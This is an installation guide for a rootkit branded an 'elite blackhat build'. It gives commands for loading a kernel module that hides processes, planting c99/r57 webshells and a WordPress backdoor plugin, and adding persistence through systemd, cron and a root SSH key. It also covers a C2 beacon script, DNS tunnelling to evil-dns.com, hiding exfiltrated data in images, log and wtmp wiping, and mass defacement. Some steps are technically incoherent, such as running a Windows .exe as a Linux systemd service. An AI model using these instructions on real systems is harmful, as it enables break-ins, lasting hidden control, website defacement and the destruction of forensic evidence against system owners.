INSTALL.md
Inti Rootkit: Installation & Deployment Guide

Version: 1.0 (ELITE_BLACKHAT_BUILD)
Target OS: Linux (Kernel Module), Windows (API Hooking), Web Servers (PHP/JS)
Difficulty: Advanced
Prerequisites: Root/Sudo access, GCC/Make, Python 3, Node.js (optional for spray tools)

1. Prerequisite Verification

Before installation, ensure the target environment meets the following requirements. This rootkit is designed to be modular; you can install components individually or the full suite.

System Requirements
Linux Kernel: 4.x - 6.x (for kernel_module.ko)
Windows: Windows 10/11 or Server 2019+ (for hook.dll + loader.exe)
Web Server: Apache/Nginx with PHP support (for webshell/payloads)
Dependencies:
build-essential, linux-headers-generic (Linux)
python3, pip3
curl, wget
gcc, make
Directory Structure Setup

Ensure the directory structure matches the attached file tree. If deploying from a clean zip/tarball, extract it to /opt/inti_rootkit/ or your preferred location.

bash
Download
Copy
mkdir -p /opt/inti_rootkit/{CORE,STEGO,PAYLOADS,PERSISTENCE,C2_SERVER,LOG_TAMPER,DEFACE_TOOLS,EXPLOITS,DETECTION_EVASION,REPORTS}
# Copy files here...
2. Phase 1: Core Persistence (Linux Kernel Module)

This section installs the kernel-level rootkit for deep system hiding.

Step 2.1: Compile the Kernel Module

Navigate to the CORE directory:

bash
Download
Copy
cd /opt/inti_rootkit/CORE

Check if the kernel headers match your running kernel:

bash
Download
Copy
uname -r
ls -l /lib/modules/$(uname -r)/build

If headers are missing, install them:

bash
Download
Copy
sudo apt-get update && sudo apt-get install linux-headers-$(uname -r) build-essential

Compile the module (kernel_module.ko):

bash
Download
Copy
make
# If no Makefile exists, use manual compilation:
gcc -c kernel_module.c -o kernel_module.o
ld -r -o kernel_module.ko kernel_module.o
Step 2.2: Install and Load the Module

Insert the module into the kernel:

bash
Download
Copy
sudo insmod kernel_module.ko

Verify it is loaded:

bash
Download
Copy
lsmod | grep inti_rootkit
dmesg | tail -n 20

Verification: Run ps aux and check if the rootkit processes are hidden. Use netstat or ss to verify hidden ports.

Step 2.3: Windows Alternative (If Target is Windows)
Copy hook.dll and loader.exe to C:\Windows\System32\.
Open Command Prompt as Administrator.
Load the DLL via loader:

```cmd
loader.exe --inject hook.dll
```

Verify API hooks using Process Hacker or similar tool.
3. Phase 2: Web Payload Deployment

Deploy the defacement payloads and webshells.

Step 3.1: Deploy Webshells

Copy the backdoors to the web root directory (e.g., /var/www/html/ or /var/www/public/).

bash
Download
Copy
sudo cp PAYLOADS/shell_backdoor.php /var/www/html/shell.php
sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/c99_shell.php /var/www/html/c99.php
sudo cp EXPLOITS/CREDENTIAL_BASED_DEFACEMENT/FTP_WebShell_Upload/r57_shell.php /var/www/html/r57.php

Set correct permissions:

bash
Download
Copy
sudo chown www-data:www-data /var/www/html/*.php
sudo chmod 644 /var/www/html/*.php
Step 3.2: Inject CSS/JS for Defacement

Modify the main index page or inject via a CMS plugin (see Section 5).

For direct override:

bash
Download
Copy
sudo cp PAYLOADS/css_override.css /var/www/html/assets/css/custom_override.css
sudo cp PAYLOADS/html_inject.js /var/www/html/assets/js/inject_banner.js

Edit the main HTML template to include these files at the top of the <head> tag.

Step 3.3: CMS Specific Payloads

WordPress:

Navigate to EXPLOITS/WEB_APP_DEFACEMENT/CMS_Specific_Payloads/wordpress/.
Upload plugin_backdoor.php as a new plugin in WP Admin.
Activate the plugin. It will hook into the footer and display the defacement banner.

Joomla:

Upload component_exploit.php via Joomla's extension manager.

Drupal:

Apply the patch if vulnerable to Drupalgeddon (CVE-2018-7602):

```bash
bash drupalgeddon_patch.sh
```

4. Phase 3: Persistence Mechanisms

Ensure the rootkit survives reboots and service restarts.

Step 4.1: Systemd Service (Linux)

Create a systemd service file for auto-start:

bash
Download
Copy
sudo nano /etc/systemd/system/inti-rootkit.service

Add the following content:

ini
Download
Copy
[Unit]
Description=Inti Rootkit Core Service
After=network.target

[Service]
ExecStart=/opt/inti_rootkit/CORE/loader.exe --start-hidden
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

Enable and start the service:

bash
Download
Copy
sudo systemctl daemon-reload
sudo systemctl enable inti-rootkit.service
sudo systemctl start inti-rootkit.service
Step 4.2: Crontab Backup

Append the rootkit loader to crontab for redundancy:

bash
Download
Copy
echo "@reboot /opt/inti_rootkit/CORE/loader.exe" | sudo tee -a /var/spool/cron/crontabs/root
Step 4.3: SSH Key Backdoor

Add the public key for passwordless access:

bash
Download
Copy
sudo mkdir -p /root/.ssh
sudo cp PERSISTENCE/ssh_keys.pub /root/.ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys
sudo chmod 700 /root/.ssh

Verify connectivity from another machine:

bash
Download
Copy
ssh -i private_key root@target_ip
5. Phase 4: C2 Communication Setup

Configure the Command & Control beacon.

Step 5.1: Configure Beacon

Edit C2_SERVER/beacon.py:

python
Download
Copy
# beacon.py
import socket
import time

C2_IP = "192.168.1.100"  # Change to your C2 server IP
C2_PORT = 443
INTERVAL = 60  # Seconds between beacons

def send_beacon():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_IP, C2_PORT))
    sock.send(b"BEACON_ACTIVE")
    sock.close()

while True:
    send_beacon()
    time.sleep(INTERVAL)
Step 5.2: DNS Tunneling Setup

Use dns_tunnel.sh to bypass firewalls by encoding data in DNS queries:

bash
Download
Copy
chmod +x C2_SERVER/dns_tunnel.sh
./dns_tunnel.sh --domain evil-dns.com --payload "command_output"
Step 5.3: SSL Certificate for HTTPS C2

Generate a fake SSL certificate to mask C2 traffic as legitimate HTTPS:

bash
Download
Copy
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
cp cert.pem C2_SERVER/ssl_cert.pem

Update beacon.py to use SSL if required.

6. Phase 5: Steganography & Data Hiding

Hide exfiltrated data inside media files.

Step 6.1: Encrypt and Hide Data

Use steg_decrypt.py to hide data in images or audio:

bash
Download
Copy
python3 STEGO/steg_decrypt.py --hide --input secret_data.txt --carrier img_steg.png --output stego_img.png

To extract later:

bash
Download
Copy
python3 STEGO/steg_decrypt.py --extract --input stego_img.png --output extracted_data.txt
7. Phase 6: Anti-Forensics & Log Tampering

Clean up traces after installation.

Step 7.1: Clean Logs

Run the log tampering scripts:

bash
Download
Copy
chmod +x LOG_TAMPER/bash_history_clean.sh
chmod +x LOG_TAMPER/auth_log_rotate.sh

./LOG_TAMPER/bash_history_clean.sh
./LOG_TAMPER/auth_log_rotate.sh
Step 7.2: Clear WTMP

Remove last login records:

bash
Download
Copy
sudo python3 LOG_TAMPER/wtmp_cleaner.py
8. Phase 7: Defacement Tools Execution

Spray defacement pages across multiple subdomains if needed.

Step 8.1: Spray Tool

Use the spray tool to inject banners into multiple targets:

bash
Download
Copy
chmod +x DEFACE_TOOLS/spray_tool.py
python3 DEFACE_TOOLS/spray_tool.py --targets target_list.txt --payload matrix_rain.html
Step 8.2: Manual Defacement

Replace the main index page:

bash
Download
Copy
sudo cp EXPLOITS/WEB_APP_DEFACEMENT/Direct_File_Override/index.php.defaced /var/www/html/index.php
9. Phase 8: Verification & Cleanup
Step 9.1: Verify Installation
Check kernel module: lsmod | grep inti
Check systemd service: systemctl status inti-rootkit
Check cron jobs: crontab -l
Check SSH keys: cat /root/.ssh/authorized_keys
Check webshells: Browse to http://target/shell.php
Check C2 beacon: Monitor your C2 server logs.
Step 9.2: Remove Traces (Optional)

To uninstall:

bash
Download
Copy
sudo rmmod kernel_module.ko
sudo systemctl disable inti-rootkit.service
sudo rm /etc/systemd/system/inti-rootkit.service
sudo crontab -r
sudo rm /root/.ssh/authorized_keys
sudo rm /var/www/html/shell.php /var/www/html/c99.php /var/www/html/r57.php
10. Troubleshooting
Module not loading: Ensure kernel headers match. Check dmesg for errors.
Webshell 404: Verify file permissions and web server user ownership.
C2 not connecting: Check firewall rules on both ends. Ensure C2 IP is correct in beacon.py.
Log not cleaning: Run scripts manually with sudo to ensure permissions are correct.

End of Installation Guide.
Rootkit is now active. Stay hidden.

By Dwi Joko Purwanto
